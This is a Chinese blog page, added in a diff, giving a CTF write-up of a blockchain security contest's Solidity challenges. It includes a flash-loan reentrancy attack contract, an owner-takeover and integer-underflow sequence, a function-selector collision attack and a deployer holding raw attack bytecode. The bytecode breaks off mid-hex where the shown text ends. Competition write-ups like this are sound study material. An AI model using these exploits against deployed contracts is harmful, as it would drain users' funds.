@@ -1,0 +1,693 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zpano.cn","root":"/","images":"/images","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="北成团队实现了全解依旧只能获得获得三等奖，懂的人都懂。简单的复盘一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="首届可信链区块链安全攻防大赛Solidity合约全解">
+<meta property="og:url" content="https://zpano.cn/2021/10/22/30/index.html">
+<meta property="og:site_name" content="Zpano&#39;s Blog">
+<meta property="og:description" content="北成团队实现了全解依旧只能获得获得三等奖，懂的人都懂。简单的复盘一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/Untitled.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023203413456.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023203446205.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023204306611.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023204540146.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023204601673.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023204454937.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023204640686.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023204926238.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023205159002.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023205111292.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023205508672.png">
+<meta property="og:image" content="https://zpano.cn/2021/10/22/30/image-20211023210439745.png">
+<meta property="article:published_time" content="2021-10-22T14:29:18.451Z">
+<meta property="article:modified_time" content="2021-10-24T04:03:21.382Z">
+<meta property="article:author" content="Zpano">
+<meta property="article:tag" content="区块链安全">
+<meta property="article:tag" content="智能合约安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zpano.cn/2021/10/22/30/Untitled.png">
+
+
+<link rel="canonical" href="https://zpano.cn/2021/10/22/30/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>首届可信链区块链安全攻防大赛Solidity合约全解 | Zpano's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Zpano's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">不负韶华，不负野心</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E4%B8%80"><span class="nav-number">2.</span> <span class="nav-text">赛题一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E4%BA%8C"><span class="nav-number">3.</span> <span class="nav-text">赛题二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E4%B8%89"><span class="nav-number">4.</span> <span class="nav-text">赛题三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E5%9B%9B"><span class="nav-number">5.</span> <span class="nav-text">赛题四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E4%BA%94"><span class="nav-number">6.</span> <span class="nav-text">赛题五</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E5%85%AD"><span class="nav-number">7.</span> <span class="nav-text">赛题六</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E4%B8%83"><span class="nav-number">8.</span> <span class="nav-text">赛题七</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E5%85%AB"><span class="nav-number">9.</span> <span class="nav-text">赛题八</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E4%B9%9D"><span class="nav-number">10.</span> <span class="nav-text">赛题九</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Zpano"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Zpano</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zpano.cn/2021/10/22/30/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Zpano">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zpano's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          首届可信链区块链安全攻防大赛Solidity合约全解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-22 22:29:18" itemprop="dateCreated datePublished" datetime="2021-10-22T22:29:18+08:00">2021-10-22</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-10-24 12:03:21" itemprop="dateModified" datetime="2021-10-24T12:03:21+08:00">2021-10-24</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">区块链安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>17k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>15 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">北成团队实现了全解依旧只能获得获得三等奖，懂的人都懂。简单的复盘一下</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了不使得文章过长，将代码文件放置在<a target="_blank" rel="noopener" href="https://github.com/zpano/BlockChain-Security/">个人GitHub上 欢迎star</a> 提供下载</p>
+<h1 id="赛题一"><a href="#赛题一" class="headerlink" title="赛题一"></a>赛题一</h1><p>通过重写函数实现重入攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">interface IFlashLoanTokenReceiver &#123;</span><br><span class="line">    function execute() external;</span><br><span class="line">&#125;</span><br><span class="line">function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; token.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;&#x3D; amount, &quot;Not enough ETH in balance&quot;);</span><br><span class="line">        token.transfer(msg.sender, amount);</span><br><span class="line">        IFlashLoanTokenReceiver(msg.sender).execute();</span><br><span class="line"></span><br><span class="line">        require(token.balanceOf(address(this)) &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>攻击思路：</p>
+<ul>
+<li>首先进入flashLoan函数，贷走所有的金额</li>
+<li>利用IFlashLoanTokenReceiver(msg.sender).execute();重入调用deposit函数，将钱归还闪电贷。此时由于重入deposit函数，会记录一个错误的用户余额。</li>
+<li>调用withdraw函数获得合约中全部的token。</li>
+</ul>
+<p>攻击代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract dvt1_attack&#123;</span><br><span class="line">    address target &#x3D; DaoPool address;</span><br><span class="line">    address token &#x3D; DVT1 address;</span><br><span class="line">	  uint256 amount;</span><br><span class="line">    function execute() external &#123;</span><br><span class="line">        IERC20(token).approve(target,amount);</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;deposit(uint256)&quot;, amount)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        amount &#x3D; IERC20(token).balanceOf(target);</span><br><span class="line">        target.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;flashLoan(uint256)&quot;, amount)</span><br><span class="line">        );</span><br><span class="line">        target.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;withdraw()&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="赛题二"><a href="#赛题二" class="headerlink" title="赛题二"></a>赛题二</h1><ul>
+<li>owner权限控制错误</li>
+<li>空投薅羊毛</li>
+<li>有奖竞猜</li>
+<li>整数溢出</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function DvT2() public&#123; &#x2F;&#x2F;owner权限控制错误</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function profit() public &#123;  &#x2F;&#x2F;空投薅羊毛</span><br><span class="line">        require(gift[msg.sender]&#x3D;&#x3D;0);</span><br><span class="line">        gift[msg.sender]&#x3D;1;</span><br><span class="line">        balanceOf[msg.sender]+&#x3D;1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function betgame(uint secretguess) public &#123;  &#x2F;&#x2F;有奖竞猜</span><br><span class="line">        require(balanceOf[msg.sender]&gt;0);</span><br><span class="line">        balanceOf[msg.sender]-&#x3D;1;</span><br><span class="line">        if (secretguess&#x3D;&#x3D;secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+&#x3D;2;</span><br><span class="line">            isbet[msg.sender]&#x3D;1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">function doublebetgame(uint secretguess) public only_owner&#123;</span><br><span class="line">        require(balanceOf[msg.sender]-2&gt;0);</span><br><span class="line">        require(isbet[msg.sender]&#x3D;&#x3D;1);</span><br><span class="line">        balanceOf[msg.sender]-&#x3D;2;</span><br><span class="line">        if (secretguess&#x3D;&#x3D;secret)</span><br><span class="line">        &#123;</span><br><span class="line">            balanceOf[msg.sender]+&#x3D;2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>调用DvT2函数使自己变成owner</li>
+<li>调用setsecret函数设置secret</li>
+<li>调用profit空投以便后续调用betgame</li>
+<li>调用一次正确betgame 使得balanceOf[msg.sender]=2</li>
+<li>调用一次错误betgame 使得balanceOf[msg.sender]=1</li>
+<li>调用一次错误doublebetgame使得balanceOf[msg.sender]下溢出</li>
+<li>调用payforflag</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://ropsten.etherscan.io/address/0x675f4b9bb2f2380470570c64bab801e0ad76ee68">攻击过程</a></p>
+<h1 id="赛题三"><a href="#赛题三" class="headerlink" title="赛题三"></a>赛题三</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function TransferOrAirDrop(address to, bool isTransfer, bytes calldata _method, uint256 amount) external &#123;</span><br><span class="line">        if (isTransfer) &#123;</span><br><span class="line">            bytes memory returnData;</span><br><span class="line">            bool success;</span><br><span class="line">            (success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(address,address,uint256)&quot;))),abi.encode(msg.sender,to,amount)));</span><br><span class="line"></span><br><span class="line">            require(success, &quot;executeProposal failed&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            bytes memory returnData;</span><br><span class="line">            bool isFristAirDropFlag;</span><br><span class="line">            bool success;</span><br><span class="line">            if(AirDropCount[msg.sender] &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                isFristAirDropFlag &#x3D; true;</span><br><span class="line">            &#125; else if (AirDropCount[msg.sender] &gt; 2) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            (success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bool,address)&quot;))), abi.encode(isFristAirDropFlag, msg.sender)));</span><br><span class="line">            require(success, &quot;executeProposal failed&quot;);</span><br><span class="line">            AirDropCount[msg.sender]++;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>与八月份发生的Poly Network 事件类似，通过实现哈希碰撞调用DVT3合约的changeOwner函数，将DVT3合约的owner重置为我们所掌握的以太坊账号进而触发<code>SendFlag</code>事件</p>
+<p><img src="/2021/10/22/30/Untitled.png" alt="Untitled"></p>
+<p><img src="/2021/10/22/30/image-20211023203413456.png" alt="image-20211023203413456"></p>
+<p><img src="/2021/10/22/30/image-20211023203446205.png" alt="image-20211023203446205"></p>
+<h1 id="赛题四"><a href="#赛题四" class="headerlink" title="赛题四"></a>赛题四</h1><ul>
+<li>合约调用（tx.origin ! = msg.sender)</li>
+<li>create2构造特定合约地址</li>
+<li>view函数两次调用返回不同值</li>
+<li>利用selfdestruc强制转账</li>
+<li>重入漏洞</li>
+<li>整数溢出漏洞</li>
+</ul>
+<p>通过分析，需要首先获得owner权限，然后调用buy函数，最后调用payforflag函数。</p>
+<ol>
+<li>获得owner权限</li>
+</ol>
+<p>获得owner权限首先要绕过change函数里面的检查，由于声明了是view函数，因此不能通过变量记录是第几次调用。于是想到通过获取gas来判断调用到了哪里。控制交易的gas值为固定值，通过一次debug记录第一次执行到该步骤时候的剩余gas值。填入合约的判断条件中即可。</p>
+<ol>
+<li>create2构造特定结尾的合约，利用另一个depoly合约辅助构建一个能绕过检查的合约。</li>
+<li>调用buy函数，同时调用多次from == to的transfer，获得足够的钱</li>
+<li>利用别的合约自毁给合约转账</li>
+<li>利用重入+整数溢出构造buyTimes的值</li>
+</ol>
+<p>前期部署</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Deployer &#123;</span><br><span class="line">    &#x2F;&#x2F; contractBytecode是待部署合约的bytecode</span><br><span class="line">    bytes contractBytecode &#x3D; hex&quot;608060405260016000806101000a81548160ff021916908315150217905550610f3b8061002d6000396000f3fe6080604052600436106100745760003560e01c80637b1c7c461161004e5780637b1c7c461461040a578063a19e69c21461045b578063c224ed1a146104ac578063dac5f65f146104f057610075565b80630c200e4c146101e85780631fbe98ce146102d05780632f54bf6e146103a357610075565b5b60008054906101000a900460ff16156101e6573373ffffffffffffffffffffffffffffffffffffffff1660c8604051602401808281526020019150506040516020818303038152906040527fe4849b32000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610161578051825260208201915060208101905060208303925061013e565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101c3576040519150601f19603f3d011682016040523d82523d6000602084013e6101c8565b606091505b50505060008060006101000a81548160ff0219169083151502179055505b005b3480156101f457600080fd5b506102ce6004803603604081101561020b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019064010000000081111561024857600080fd5b82018360208201111561025a57600080fd5b8035906020019184600183028401116401000000008311171561027c57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610541565b005b3480156102dc57600080fd5b5061031f600480360360208110156102f357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506106ec565b60405180831515815260200180602001828103825283818151815260200191508051906020019080838360005b8381101561036757808201518184015260208101905061034c565b50505050905090810190601f1680156103945780820380516001836020036101000a031916815260200191505b50935050505060405180910390f35b3480156103af57600080fd5b506103f2600480360360208110156103c657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610855565b60405180821515815260200191505060405180910390f35b34801561041657600080fd5b506104596004803603602081101561042d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061087c565b005b34801561046757600080fd5b506104aa6004803603602081101561047e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506109be565b005b6104ee600480360360208110156104c257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610c83565b005b3480156104fc57600080fd5b5061053f6004803603602081101561051357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610dbf565b005b8173ffffffffffffffffffffffffffffffffffffffff16816040516024018080602001828103825283818151815260200191508051906020019080838360005b8381101561059c578082015181840152602081019050610581565b50505050905090810190601f1680156105c95780820380516001836020036101000a031916815260200191505b50925050506040516020818303038152906040527f6bc344bc000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061067e578051825260208201915060208101905060208303925061065b565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146106e0576040519150601f19603f3d011682016040523d82523d6000602084013e6106e5565b606091505b5050505050565b60006060600060608473ffffffffffffffffffffffffffffffffffffffff1630604051602401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527f1e77933e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106107e257805182526020820191506020810190506020830392506107bf565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610844576040519150601f19603f3d011682016040523d82523d6000602084013e610849565b606091505b50915091505050915091565b6000805a905063049e797c811415610871576000915050610877565b60019150505b919050565b600060608273ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f11f776bc000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061094d578051825260208201915060208101905060208303925061092a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146109af576040519150601f19603f3d011682016040523d82523d6000602084013e6109b4565b606091505b5091509150505050565b8073ffffffffffffffffffffffffffffffffffffffff16306064604051602401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610ab55780518252602082019150602081019050602083039250610a92565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610b17576040519150601f19603f3d011682016040523d82523d6000602084013e610b1c565b606091505b5050508073ffffffffffffffffffffffffffffffffffffffff163060c8604051602401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610c165780518252602082019150602081019050602083039250610bf3565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610c78576040519150601f19603f3d011682016040523d82523d6000602084013e610c7d565b606091505b50505050565b8073ffffffffffffffffffffffffffffffffffffffff1660016040516024016040516020818303038152906040527fa6f2ae3a0000000000